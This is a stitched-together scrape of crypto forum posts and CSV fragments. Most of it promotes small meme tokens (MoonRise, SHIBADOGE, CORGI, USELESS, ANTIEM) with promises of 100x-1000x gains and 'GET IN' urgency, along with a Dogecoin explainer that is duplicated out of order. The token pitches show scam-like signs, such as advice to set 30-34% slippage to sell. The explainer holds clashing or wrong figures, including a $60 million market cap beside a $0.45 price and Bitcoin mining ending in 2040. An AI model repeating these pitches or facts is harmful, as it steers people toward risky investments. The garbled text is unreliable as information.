We have had our Audit completed by Tech Rate🔥🔥🔥 and are ready to step up our marketing and bring in new members to really push this token to the next level.

We currently have 927 Holders👫 and a low market cap of $196k, meaning there is huge potential for this project💰💰💰.

We have a dedicated Dev team who have been working on updating our website we now have a wallet function built in, the team are now focusing on NFT market and Game development🚀🚀🚀.

We have admins in the chat 24/7 who are always happy to answer any questions you may have ☎️ and a strong💪 community behind us to help push us to the next level.

Liquidity is locked🔒 and we have renounced ownership, we have set a price impact on buy orders so we don’t have these mega whales🐋 other tokens have which drop the price and buy back in a lower level so your money is SAFU🦺

Now is your chance to get into a low market cap token that’s had nice organic growth🌱 and working developing further.

We are working to be listed on CMC and CK which will be our next steps GET IN before the price is a lot higher📈.

So far 31% has been burned!  Telegram's doing great. We started out with solid liquidity, we didn't just throw this together with a couple hundred bucks. Our goal is to kill as many zero's as we can with this hyer deflationary burn tax.

If anyone experiences problems buying or selling. Set the slippage to 13% and put an even number of tokens and not too many decimals. You can join telegram if you have any concerns. Currently when you sell you may need to try a higher slippage 30-34% but if you wait for the taxes to go down it'll be much lower

DOGE,CryptoCurrencyTrading,"Play with PolyDoge on Owl Crypto Casino - the first full-featured Crypto Casino, with live dealers, and hot games such as video poker and blackjack and more - all under one roof."," Just announced, [owl.games](https://owl.games/) and the PolyDoge integration is a giant step ahead in one of the hottest segments in the crypto entertainment industry. Owl brings their own brand of unique casino experience, with live dealers, a plethora of games - fully functioning already out of the box, no vaporware here - to multiple chains, including the bullish Polygon L2 chain, roaring for another leg up following the announcement of the further integration of rollups with zkEVM through the acquisition and merger with Hermez.

With Owl prioritizing the most popular and highest utility use tokens on Polygon at launch, it is no wonder that MATIC, USDC and USDT were chosen alongside the unofficial ""mascot of MATIC"", Polydoge for use in their game - and with the opportunity to rake home more of an extremely attractive low mcap 1000X potentiality like Polydoge, playing responsibly to earn was never a more exciting deal. 20% of Owl Polydoge is also sent to a 0xdead address, raising the value of the token by Active Burn.

PolyDoge is the premier community utility token on Polygon, now with 25k+ holders and a solid social media outreach base, including the famous Bart Baker on as advisor, sitting besides sports stars and charity industry experts, with a solid 10k+ Twitter followers and a more than vibrant TG community.

To learn more about PolyDoge and access socials, announcement channels and chats, read more about the core team, the strategic vision - please visit [www.polydoge.com](https://www.polydoge.com/)

(and also to check out the hippest blockchain branded gear on the PolyDoge store, including comfy blankets to wrap yourself in case of Wyckoff fire - [www.polydogestore.com](https://www.polydogestore.com/)

As many observers have remarked, after the Sudden Bear Syndrome earlier this year, a lot of pure meme tokens simply packed in and gave up. This is the true test of fundamentals, to see how a team and a community fares during darker days. The OWL partnership is just one of the many things slowly being unveiled as the upwardly mobile PolyDoge team continues it's relentless push to deliver value for holders and to provide integration and support for the thriving general Polygon eco-system.

Rest assured that the events and gaming divisions (with [dogequake](https://www.dogequake.com/)\- the first blockchain integrated FPS released on polygon) has got way more in store for those discerning investors wishing for more than just yield farming bonanzas and high APY LP rewards over the coming next months. And remember - 1 PolyDoge is always 1 PolyDoge, and more!

PolyDoge is listed on the [#3 largest CEX for the Chinese market](https://www.mexc.com/exchange/POLYDOGE_USDT) \- MEXC - with direct, cheap onramping on PolyGon, and is of course whitelisted on QuickSwap, 1inchexchange and Sushiswap.

&#x200B;

✅ 20%+ total supply already burned from buybacks by the whale

✅ 3 AMAs already done - one with the official SatoshiStreetBets not even 24 hours after launch

✅ 4000+ holders/2800+ TG members and consistently growing thanks to experienced marketing team. 

✅ CoinGecko listed in under 12 hours; CMC coming next

✅ 2.5M+ marketcap in 3 hours thanks to the marketing, from 50k start

✅ 200 BNB currently in Whale wallet, with 350+ already spent on MoonShots (not even including buybacks)

✅ Active voice chat & community

✅ NYC/Toronto billboards being planned out

✅ Big chinese promotions incoming

✅ Coinhunt promotion incoming

✅ PoocoinAds up and running since presale

&#x200B;

MoonRise is an improved fork of the wildly-successful EverRise token, with a suite of improved features and tokenomics. Community members will be able to participate in ""Moon Shots"" using the Whale Wallet's BNB. MoonShots will be activated at holder milestones during MoonRise's launch phase, but eventually will be controlled through a community-consensus based dApp.

&#x200B;

You all already know the EverRise drill: For those wondering about the contract. The whale is filled with $MOONRISE tokens through tax, the tax is payed for by the sellers/buyers. That tax is then sold by the whale to be converted into BNB, essentially not effecting the price because the tax was paid for previously by sellers/buyers. The Whale is only contracted to buy and burn and that is it, we cannot touch the BNB we can only adjust how much the buyback is set to! (everrise)

&#x200B;

👉 But here's what makes 🌛 $MoonRise 🌛 special. The team has implemented a ""callMoonShot"" function into the contract, which basically spends a voted-upon amount of BNB directly from the Whale address, to pump into the market. You can view live countdowns to these pumps (currently based off of wallet holder milestones) on the website: [https://MoonRiseCoin.com](https://moonrisecoin.com/)

DOGE,CryptoCurrencyTrading,🔥 SHIBADOGE | Join the Community 🚀 Presale coming soon 💵 Best SHIBA & DOGE Rewards Token: Investors get 8% SHIBA or DOGE coin ⭐️Huge Potential !!! ❌,"The Story of Shiba Doge

Shiba Inu and Doge met at a coffee shop for their first date. They always had high aspirations to build something big together. But, it wasn’t until that fateful day at the coffee shop that they decided to do something so big, right there on the ,coffee table napkin. They pulled their chairs closer together and drew a road map to moon- The Shiba Inu Doge Moonmap. After planning out their next few weeks together, they decided to start building a rocket and plan their first trip to space together. Join Shiba Doge and become a part of the community as we build our rocket to space 🚀

What is ShibaDoge?

The newest and most exciting crypto currencies to date is SHIBA DOGE. The SHIBA DOGE token is a hyper-deflationary token that focuses on rewarding holders automatically with ,Shiba or Doge. This revolutionary concept is based on the stability of Shiba /Doge and instilling, holders with the confidence that they will be holding it as a stable reflection. What sets SHIBA DOGE aside from the rest of the pack are the Shiba or Doge reflections that each holder will receive. 

The SHIBA DOGE token project team is led by a team of successful developers and experienced marketing professionals in the BSC space. The team aims to encourage investors to hold their tokens by rewarding investors automatically ,with Shiba or Doge.

There’s no hiding anything on the blockchain. You are more than welcome to assess for yourself the legitimacy of this project based on the transaction on the public ledger. Check out this webpage for a crash-course on how to spot and avoid rug pulls. The SHIBA DOGE team encourages knowledgeable buyers who understand the risks and intricacies of trading cryptographic tokens, including how to safely transact and store tokens. As with most cryptographic tokens, SHIBA DOGE is liable to experience extreme fluctuations in price over a short period of time. By purchasing SHIBA DOGE tokens, users expressly acknowledge and represent that they fully understand that the token may experience volatility in pricing and will not seek to hold the issuer liable for any losses or any special, incidental, or consequential damages arising from, or in any way connected to, the purchase of SHIBA DOGE token.

DOGE,CryptoCurrencyTrading,MicroDogeInu | a brand new token that just released and already has gained big amounts of traction and has a bright future ahead.,"Micro doge inu

Made by a trusted dev with a great track record of successful projects.

Since the Micromachines fork (previous project) got hyped up the dev decided to make another one with updated tokenomics: 4% burn / 4% to LP / 2% to holders. With this I believe they will continue to make their journey to the moon.

Their telegram reached 200 members within minutes which for me is a sign that there is a lot of potential. It's also a small proof that they are safu and trusted.

They have already applied for coinhunt and coinsnipe which is a good sign of things to come.

They are also currently doing a contest where they are giving out BNB, for more info join their telegram with the link down below. The contest will end at 1 hour before launch

[https://t.me/MicroDogeInu](https://t.me/MicroDogeInu)

I personally plan on aping in since I like to be early and that's also where most of the money is made, I think this does have a lot of upside potential but with that being said always remember to do your own research and due diligence. Also if you're going to invest into projects like these don't forget to take profits.

Good luck!",16,2021-07-04 14:40:27,7

DOGE,CryptoCurrencyTrading,"🔥 $CORGI, Corgi INU. Newly released! The new DOGE or SHIB on the block, with a huge potential for big pumps! 🚀 The lotto tokenomics has potential for huge gains!💎Very low market cap! 💎1800+ holders in a month!!","I'm here to share with you guys the new dog breed known as Corgi INU (CORGI). It was just recently released and it can easily 100x and has potential to 1000x. Seeing as how much DOGE, SHIB and AKIT blew up, this can easily be the next big dog!

The Supply
🔓 50% of the total supply to Uniswap has been locked and the keys have been burned! 🔓

40% was sent to Vitalik Buterin, essentially burning that portion of the supply. The remaining 10% will be distributed to wallets providing liquidity to the CORGI/ETH pool on Uniswap. This will occur after predetermined intervals of time through the use of a smart contract based lottery.

The Lottery

The lottery will be spaced out so that multiple liquidity providers will have the opportunity to win CORGI over the coming years. The first and biggest drawing will occur in the first 90 days after the tokens listing. This is to further encourage early liquidity providers.

Whitepaper: coming soon

DOGE,CryptoCurrencyTrading,"Did you miss out on RocketDogeCumInuElon Token ? Don't stress friends , you still have a chance to get in, on $Useless. True buy back mechanism, not smoke and mirrors like the others","Don’t feel like reading?
Take a quick look to visually understand our new and innovative “Pump-N-Burn” mechanic.  https://imgur.com/a/6swubWX).

If you have made it this far, sorry to disappoint you. No dog breed name, no rocket/lambo spamming. Nothing but 100% honesty and transparency.

A little about Us:

1. We formed a company: Useless Crypto, LLC.
Registered in the USA, all six core team members identified on https://uselesscrypto.com/.

2. This company develops various products. For example:

- USELESS Merchandise (https://useless-crypto.myshopify.com/)
- A user-friendly chart app
- A whale tracker app
- And some not yet disclosed products

We monetize all projects and roll a profit.

3. This is where the magic happens. We are in the process of integrating a automated system that takes all profit made from our eco system and injects it directly back into the token. The beutiful part about this model is that this token does not rely solely on holders for its success. 

We have written a complex algorithm that acts as a dynamic LP stabiliser Depending on the liquidty %. 

The functions performed by this contract will inject BNB and tokens into LP if our liquidty gets low. If the liquidty is high, the contract will purchase tokens and send them to burn address. This will help keep our liquidty at a desired % and a price floor increase overtime, whilst also adding another form of automated burning of tokens.

This makes $USELESS the world's first serious hyper-hyper deflationary token. Buybacks are from external BNB, not recycled from internal BNB -- like so many other tokens!

Picture explaining external VS internal buybacks 

https://imgur.com/a/0TwH42B

So, some more quick facts:

We are part of the new “DeFi Alliance”
Created by ex-SafeMoon core team member Ragnar, which also includes notable projects such as:
- PiggyBankToken 
- The Collective Coin
- 95 % friendly whales
29 of the top 30 holders came forward and have agreed to support the project
-Tokenomics – because why the hell not?
4 % is added to LP, 4 % is distributed to the holders (incl. burn wallet)

Merch, as a proof-of-concept, is already running smoothly.

Apps that'll benefit the whole crypto space are in the state of a decent progress. Striving to provide an app and features that'll be the ""Robinhood"" of the DeFi-Space and benefit the whole space (Portfolio manager, Whaletracker, easy-to-use chart (poocoin, bogged and dex.guru really do suck right?)

Think Bored Apes/Stoned Apes but for the Doge Character :)

We hope for SnoopDoge to become a widely accepted meme currency online and in the metaverses, to buy concert tickets, merch, in game NFTs and much more.  We are also interested to allow the purchasing of Cannabis products worldwide using Snoop Doge.

DOGE,Binance,Dogecoin has a cap!!!🚀,"Here is the explanation by u/CEO_OF_DOGECOIN that you should read:

I'm keen to try to help find a way to help Patrick and others get more sleep and not need to explain obvious stuff to people.

Perhaps it can help if we reframe things a little and have a simplified and clear explanation that doesn't provoke counter-questions. I provide an explanation which is a little simplified and geared toward newcomers.

For people who say Dogecoin is ""unlimited"" or ""permanently inflationary""
Answer:

1.	⁠Dogecoin supply inflation is currently 3.9% per year, and it falls every year.
2.	⁠Over time new supply eventually would fall to an arbitrarily low value (0.0000000000001% per year, etc) but can never reach exactly 0%.
3.	⁠There are always coins lost due to abandoned dust and lost keys. At some point (and maybe already) these lost coins will outweigh the new supply. Therefore Dogecoin is a deflationary coin.

Elon Musk expressed this point succinctly when he wrote: ""Doge appears to be inflationary, but is not meaningfully so (fixed # of coins per unit time), whereas BTC is arguably deflationary to a fault.""

For people who say Dogecoin has ""No Cap""
Answer: Dogecoin has a cap, and that cap is 10k per block. It is not like fiat which lacks a cap because the supply can be adjusted at any point. Doge's new supply is fixed eternally at 10k per block. This amounts to 3.9% supply inflation in 2021, and every year it gets lower, but it never gets to literally 0%.

Elon Musk expressed this point succinctly when he wrote: ""Doge appears to be inflationary, but is not meaningfully so (fixed # of coins per unit time), whereas BTC is arguably deflationary to a fault.""

I'm happy for any shibe to copy-paste these answers, and I think they resolve 99% of queries about supply.",110,2021-02-13 03:39:26,118

Update: I was able to purchase some Dogecoin at 11:28pm on Binance after not even being able to login. I’m in US/Virginia. I already had a balance in my USD amount on Binance and was able to make a small $25 buy.

BUT... I’m done with brokerages lol. Question; What cold wallet should I use to store my crypto I am undecided on which one. I’ve only done a little research on the ledger nano X and the Trezor. I will keep researching those and others but does anyone here have advice on what is best?

##### Anti Elon Musk is the number one anti-troll movement in the world whose official cryptocurrency is ANTIEM. The movement was created to raise awareness of serious social problems and thereby encourage people to take responsibility. So we hereby declare 2022 the year of the campaign against Elon Musk. What the 2008 global economic crisis meant to Satoshi Nakamoto is that the creation of Bitcoin for the Anti Elon Musk movement is a measure of global social problems and that Elon Musk has become Man of the Year, according to Time magazine.

&#x200B;

[Anti Elon Musk](https://preview.redd.it/xrdm9btpaod81.png?width=512&format=png&auto=webp&s=d3f037b6ad33b867d6f02dc6cf837e07b76d3722)

#### Point Zero

Anti Elon Musk Cryptocurrency was born on 21.12.2021 (it can’t be a coincidence) this winter solstice, which is the darkest day of the year, henceforth the days are getting longer. After the birth of the ANTIEM cryptocurrency, mysterious forces began to move around our world and on January 1, 2022, the Anti Elon Musk movement (Zero Point) began. From then on, the Anti Elon Musk Movement will continually target new and emerging global social problems and condemn them to destruction so that the number of hours of sunshine never diminishes again.

#### Why exactly Elon Musk?

He is currently the richest man in the world and thus has a very big impact on our world with every single public speech (every day). His manifestations are often astonishingly irresponsible and harmful from a social point of view. It is important to note that the problem is not with the person of Elon Musk as a private person, but with the archetype that is called the Anti Christ Person or also known as the Troll Face. That's why Anti Elon Musk became the name of the movement and the world's first anti-troll crypto currency.  


Fight fire with fire, it's a troll with a troll.

#### AntiChrist person

For example: Pope Horst Fuchs, the pope of TeleShop, sells a sock tweezers or a fruit smoothie machine on television with the promise that all your problems will be solved if you buy or say Brian Tracy, the world-renowned motivational trainer, says you just want to succeed and succeed in the world. These are the moments when we can see the manifestation of Anti Christ by those individuals.

[https://antielonmusk.com/](https://antielonmusk.com/)

## TOKENOMICS

A total of 888,888,888 Anti Elon Musk tokens have been made, which can be divided into 8 decimal places and will never be made again.

The transaction fee is 8% ,

7% liquidity fee,

1% project maintenance fee (For Development, Donation, etc.)

### Why the number 8?

With this number, the Buddhists marked the path to the elimination of suffering in Nirvana, which is called the “noble eightfold path” because of its division into eight. And these are the right recognition, the right thinking, the right speech, the right action, the right lifestyle, the right effort, the right reflection, and the right immersion.

The Troll face is the person who, if you leave a room, there will be more than one right there. If Elon Musk leaves a room, there will be eight more right away.

First of all, the number eight has a lot of meanings. Undoubtedly the best is the number system 12, in which the eight means two-thirds, ie a ratio (we also use the number system 12 to measure time). The opposite is the number system of 10 where two-thirds of 6.66 is a non-round number, which is moreover a symbol of evil or also known as the number of Satan. While 666 is the number of the dark side, the eighth is all positive and the eighth is 888 the bright side.

Elon Musk is the leading wizard on the dark side who is destroying our world with his troll army. The Anti Elon Musk movement is the leader of the bright side.

**Bullshit**

Our only female founding member says it’s just because :)))) and anyway Elon Musk is eight letters!

# General Conclusion

In the past time, we have witnessed tremendous growth from Dogecoin. Especially this growth comes from Elon Musk when he constantly ""memes"" about this coin. It is clear that even though Dogecoin is **only created just for fun**, this coin has reached a market cap of over US$60 million a few days ago.In today's article, let's dive into Dogecoin based on the analysis of the economic mechanism we often use. Spoiler alert: this might not be the coin you want to put your money in. At least we do not.Note: This article is not meant to be offensive, we respect the development of any coin in the space. Let's go!

# What Is Dogecoin?

* A meme coin
* A crypto currency
* Built using the Bitcoin infrastructure, but not related to Bitcoin prices

Dogecoin ($DOGE) is an open-source p2p cryptocurrency. It can easily be sent through the internet from person to person with security. You can send Dogecoin anywhere in a second, faster and cheaper than Bitcoin.One of the important points for Dogecoin is that it is already accepted at online retailers. Dogecoin can be used in payment, buy items at gamestop, trade and so much more.

## $DOGE In Real Life

>What is make Dogecoin truly unique from other currencies?

Dogecoin's ease of use makes it the perfect way to instantly send cash gifts to people all around the world.You can send 10 cents to your favourite comment on Twitter or $10 to your favourite band to purchase their latest album, you can even send $100 to a charity that you support. If you are a creator your fans can financially empower you for the first time. You can directly receive cash from them, rather than a valueless ""like"" on Facebook or ""retweet"" on Twitter. This allows you to focus on creating content instead of thinking about counting cents.

# How Did $DOGE Start?

Dogecoin was created on December 6, 2013, by a pair of software engineers **as a joke.**Billy Markus, an IBM programmer from Portland, Oregon, created his cryptocurrency from bitcoin source and at the time attracted a small pool of miners.Since Markus wanted his cryptocurrency to be public, he sought help from Jackson Palmer, who works for Adobe (ADBE). Palmer purchased the domain dogecoin .com - a formation for the ""doge"" meme that was popular on the internet at the time.The site originated as a joke: the image of the Shiba Inu dog representing $DOGE was the first image, and was surrounded by a series of broken English Comic Sans text.On dogecoin .com, its mascot is captioned:

>""Dogecoin is an open-source peer-to-peer digital currency, favoured by Shiba Inus worldwide.""

# The Economics of $DOGE

The same with other cryptocurrencies, $DOGE is a digital currency that can be bought and sold like an investment and spent like money.While each cryptocurrency is unique, they share some similarities with its more well-known peers, since they are all forks of Bitcoin — Bitcoin Cash. But they have a few key differences.Unlike bitcoin, which has only 21 million Bitcoins that can be mined, dogecoin has 129 billion coins in circulation and will continue to make new blocks of coins available for mining each year. That's part of the reason why a dogecoin is currently valued at around $0.45 and a bitcoin is valued at around $40,000.

## Market Design

While cryptocurrency is gaining more acceptance as a currency for buying goods, dogecoin is not being used much in the real world. It has several niche markets, including using dogecoin to make money for online artists.And the main difference is from the active online community of dogecoin. This is what makes this coin so interesting. The group, which is active on Reddit, has donated money (in dogecoin) to charitable causes and in 2014. Or the group successfully raised a grant for drivers advertising dogecoin in their cars. 

## Mechanism Design

### Governance

$DOGE has no administrative features. The same is true for cryptocurrencies that are forked from Bitcoin. The governance is baked directly into the code. This is because it is a simple payment use-case, unlike other DeFi protocols with more complex computation that we have been discussing thus far.

### Structure

$DOGE uses the same PoW algorithm as Bitcoin. Miners can own $DOGE by participating in maintaining the network as $DOGE.

## Token Design

### Token Policy

The design of $DOGE is not fixed in supply, meaning it can be mined forever and its value depends on demand from users.Bitcoin, like many other altcoins, has a hard limit on the number of cryptocurrencies they will allow. Dogecoin does the opposite, allowing for an ever-increasing supply but in a steady absolute amount each year.For example, in 2040, there will be no more Bitcoins that can be mined. Therefore, this will encourage hoarding of the Bitcoin supply. This will push up Bitcoin's price, but reduce Bitcoin's actual transaction volume (i.e. reduce the available floating volume).On the other hand, by allowing 5 billion $DOGE per year to increase the supply of Dogecoins infinitely, the supply will increase, but eventually, reach the actual limit. Thus, we can calculate the inflation rate of a currency over time.

### Financial Incentives

In this respect, $DOGE is paid to those who join the network. The money earned from mining $DOGE will be the main profit for mining. **TLDR**:$DOGE is a cryptocurrency that was created by a joke, but has an amazing growth as it is in the top 10 of the largest cryptocurrencies by capitalisation.When looking at the design aspects, $DOGE is basically similar to Bitcoin but without a fixed supply and has the same amount of $DOGE mined each year (5 billion $DOGE). In terms of mining, it is different from Bitcoin as the number of Bitcoin mining is halved every 4 years.Financial incentive when you become a miner, you join the network, maintain it and get a reward of $DOGE. Despite having a very simple mechanism, the community of Dogecoin is very large and loyal. That's why this Cryptocurrency still exists.",1,2021-09-19 08:57:20,4

The same with other cryptocurrencies, $DOGE is a digital currency that can be bought and sold like an investment and spent like money.While each cryptocurrency is unique, they share some similarities with its more well-known peers, since they are all forks of Bitcoin — Bitcoin Cash. But they have a few key differences.Unlike bitcoin, which has only 21 million Bitcoins that can be mined, dogecoin has 129 billion coins in circulation and will continue to make new blocks of coins available for mining each year. That's part of the reason why a dogecoin is currently valued at around $0.45 and a bitcoin is valued at around $40,000.

## Market Design

While cryptocurrency is gaining more acceptance as a currency for buying goods, dogecoin is not being used much in the real world. It has several niche markets, including using dogecoin to make money for online artists.And the main difference is from the active online community of dogecoin. This is what makes this coin so interesting. The group, which is active on Reddit, has donated money (in dogecoin) to charitable causes and in 2014. Or the group successfully raised a grant for drivers advertising dogecoin in their cars.

## Mechanism Design

### Governance

$DOGE has no administrative features. The same is true for cryptocurrencies that are forked from Bitcoin. The governance is baked directly into the code. This is because it is a simple payment use-case, unlike other DeFi protocols with more complex computation that we have been discussing thus far.

### Structure

$DOGE uses the same PoW algorithm as Bitcoin. Miners can own $DOGE by participating in maintaining the network as $DOGE.

## Token Design

### Token Policy

The design of $DOGE is not fixed in supply, meaning it can be mined forever and its value depends on demand from users.Bitcoin, like many other altcoins, has a hard limit on the number of cryptocurrencies they will allow. Dogecoin does the opposite, allowing for an ever-increasing supply but in a steady absolute amount each year.For example, in 2040, there will be no more Bitcoins that can be mined. Therefore, this will encourage hoarding of the Bitcoin supply. This will push up Bitcoin's price, but reduce Bitcoin's actual transaction volume (i.e. reduce the available floating volume).On the other hand, by allowing 5 billion $DOGE per year to increase the supply of Dogecoins infinitely, the supply will increase, but eventually, reach the actual limit. Thus, we can calculate the inflation rate of a currency over time.

### Financial Incentives

In this respect, $DOGE is paid to those who join the network. The money earned from mining $DOGE will be the main profit for mining. **TLDR**:$DOGE is a cryptocurrency that was created by a joke, but has an amazing growth as it is in the top 10 of the largest cryptocurrencies by capitalisation.When looking at the design aspects, $DOGE is basically similar to Bitcoin but without a fixed supply and has the same amount of $DOGE mined each year (5 billion $DOGE). In terms of mining, it is different from Bitcoin as the number of Bitcoin mining is halved every 4 years.Financial incentive when you become a miner, you join the network, maintain it and get a reward of $DOGE. Despite having a very simple mechanism, the community of Dogecoin is very large and loyal. That's why this Cryptocurrency still exists.",3,2021-08-21 02:49:33,2

# General Conclusion

In the past time, we have witnessed tremendous growth from Dogecoin. Especially this growth comes from Elon Musk when he constantly ""memes"" about this coin. It is clear that even though Dogecoin is **only created just for fun**, this coin has reached a market cap of over US$60 million a few days ago.In today's article, let's dive into Dogecoin based on the analysis of the economic mechanism we often use. Spoiler alert: this might not be the coin you want to put your money in. At least we do not.Note: This article is not meant to be offensive, we respect the development of any coin in the space. Let's go!

# What Is Dogecoin?

* A meme coin
* A crypto currency
* Built using the Bitcoin infrastructure, but not related to Bitcoin prices

Dogecoin ($DOGE) is an open-source p2p cryptocurrency. It can easily be sent through the internet from person to person with security. You can send Dogecoin anywhere in a second, faster and cheaper than Bitcoin.One of the important points for Dogecoin is that it is already accepted at online retailers. Dogecoin can be used in payment, buy items at gamestop, trade and so much more.

## $DOGE In Real Life

>What is make Dogecoin truly unique from other currencies?

Dogecoin's ease of use makes it the perfect way to instantly send cash gifts to people all around the world.You can send 10 cents to your favourite comment on Twitter or $10 to your favourite band to purchase their latest album, you can even send $100 to a charity that you support. If you are a creator your fans can financially empower you for the first time. You can directly receive cash from them, rather than a valueless ""like"" on Facebook or ""retweet"" on Twitter. This allows you to focus on creating content instead of thinking about counting cents.

# How Did $DOGE Start?

Dogecoin was created on December 6, 2013, by a pair of software engineers **as a joke.**Billy Markus, an IBM programmer from Portland, Oregon, created his cryptocurrency from bitcoin source and at the time attracted a small pool of miners.Since Markus wanted his cryptocurrency to be public, he sought help from Jackson Palmer, who works for Adobe (ADBE). Palmer purchased the domain dogecoin com - a formation for the ""doge"" meme that was popular on the internet at the time.The site originated as a joke: the image of the Shiba Inu dog representing $DOGE was the first image, and was surrounded by a series of broken English Comic Sans text.On dogecoin, its mascot is captioned:

>""Dogecoin is an open-source peer-to-peer digital currency, favoured by Shiba Inus worldwide.""

As an example :

Right now I have 9.999 dogecoin borrowed for a value of 6.828$ (0.125232 BTC) . If I wanted to repay my debt now I would payback the interest+ the 9.999 dogecoin, but keep on my binance account the 6828 $ (0.125232 BTC) right ???

DOGE,Binance,HELP I sent 1000 dogecoins to wrong wallet,"Shit guys I have done a bad move.

I bought 1000 dogecoins on binance today and I wanted to transfer it to Trust wallet idk why.

Binance asked me to choose a transfer method and suggested to use BNB over dogecoin because it had a lower fee.

So I went to my Trust wallet, I chose BNB currency, pressed Receive and copy-pasted the address.

It has been few hours since then and still my dogecoins aren't visible on my wallet.

I should use dogecoin as my transfer method right? Can I somehow get it or is it lost forever?",0,2021-04-22 19:05:16,1

DOGE,Binance,Maybe my 2nd best investment after Dogecoin,"I stumbled across the project StudentCoin. Seems to be the biggest ICO 2021. Maybe my second best investment in 2021 after Doge.

The project is unique in the crypto space and if it starts to get more attention it can become a very popular coin.

- Anybody can create their own token on top of StudentCoin via a web interface. No programming skills required. 
- If you stake StudentCoin (STC) you earn from all transactions of the tokens on top of STC. 
- Students are the future and bring innovation and proper use cases.
- They are planning to build an education program to make students early learn about blockchain.. so they probably will use STC to build interesting projects on top of it.
  
In two weeks they just launched their wallet, mobile app and announced 3 exchange listings.

The team confirmed that STC is going to be listed on 9 new exchanges from the top 50 (a few from them are top 20 and top 10) from May 2021.

Their presale is currently live and 145 of 150 phases are finished.

A review is nothing without negative points and criticisms:

- Communication of the team could be improved

- There is a lot of FUD.. The team could just clear this up better and comment on all the criticisms. To improve that they are planning to make a team interview series from next week to be closer to the community.

- The 500 universities are not all real partners.. they just have students from those universities as supporter.. its not clear which universities are partners

The ico price is still really low with 0.021 USD.

A small portion of the circulating supply is beeing traded on CoinTiger and Uniswap for 0.03 USD already and went up to $0.07 some days ago.

StudentCoin is already on CoinMarketCap: https://coinmarketcap.com/currencies/student-coin/

StudentCoin Twitter: https://mobile.twitter.com/studentcoinorg

There are three options to participate:

- buy STC via Credit Card

- send ETH from your MetaMask wallet

- send any crypto to the Coinbase Commerce payment method

I just found out you can buy the coinbase packages but send more than the package price.. you will receive the correct amount of STC even if you overpay the package.

I recommend using Litecoin due to its low transaction fees.

Coinbase Commerce works also for US investors.

Use this bonus code to get 5% more at the purchase.
